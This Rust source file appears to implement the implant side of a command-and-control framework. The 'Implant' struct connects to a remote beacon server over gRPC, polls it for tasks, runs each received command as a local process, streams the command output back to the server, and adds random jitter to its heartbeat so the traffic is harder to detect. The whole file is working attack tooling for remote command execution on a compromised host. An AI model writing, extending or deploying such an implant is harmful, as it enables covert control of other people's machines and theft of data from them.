use anyhow::{anyhow, Result};
use rand::Rng;
use uuid::Uuid;

use tokio::io::AsyncBufReadExt;
use tokio::io::BufReader;
use tokio::process::Command;
use tonic::transport::Channel;

use super::common::{Task, Uuid as Id};
use super::tasks::{
    beacon_service_client::BeaconServiceClient, ConnectionRequest, OutputRequest, PollRequest,
};

pub struct Implant {
    client: BeaconServiceClient<Channel>,
    uuid: Uuid,
    heartbeat: u32,
}

impl From<Id> for Uuid {
    fn from(value: Id) -> Self {
        Self::from_u64_pair(value.high, value.low)
    }
}
impl From<Uuid> for Id {
    fn from(value: Uuid) -> Self {
        let (high, low) = value.as_u64_pair();
        Self { high, low }
    }
}

impl Implant {
    pub async fn connect(url: &'static str) -> Result<Self> {
        let mut client = BeaconServiceClient::connect(url).await?;
        let response = client
            .connection(tonic::Request::new(ConnectionRequest {}))
            .await?
            .into_inner();
        println!("Connect: RESPONSE={:?}", response);

        Ok(Self {
            client,
            uuid: response.uuid.ok_or(anyhow!("No uuid in request"))?.into(),
            heartbeat: response.heartbeat,
        })
    }

    pub async fn poll(&mut self) -> Result<Option<Task>> {
        let response = self
            .client
            .poll(tonic::Request::new(PollRequest {
                uuid: Some(self.uuid.into()),
            }))
            .await?
            .into_inner();

        Ok(response.task)
    }

    pub async fn cmd(&mut self, task: Task) -> Result<()> {
        let stream = async_stream::stream! {
            let shellcode = task
                .shellcode
                .ok_or(anyhow!("ShellCode cannot be empty.")).unwrap();
            let mut output = Command::new(shellcode.command).stdout(std::process::Stdio::piped()).spawn().unwrap();
            let mut lines = BufReader::new(output.stdout.take().unwrap()).lines();

            while let Some(line) = lines.next_line().await.unwrap() {
                yield OutputRequest {
                    task_uuid: task.uuid.clone(),
                    line,
                }
            }
        };
        let _response = self
            .client
            .output(tonic::Request::new(stream))
            .await?
            .into_inner();

        // println!("Out: {}", String::from_utf8_lossy(&output.stdout));
        Ok(())
    }

    pub fn jitter(&self) -> u64 {
        let offset = self.heartbeat as f32 / 100f32;
        rand::thread_rng()
            .gen_range(self.heartbeat as f32 - offset..=self.heartbeat as f32 + offset)
            as u64
    }
}
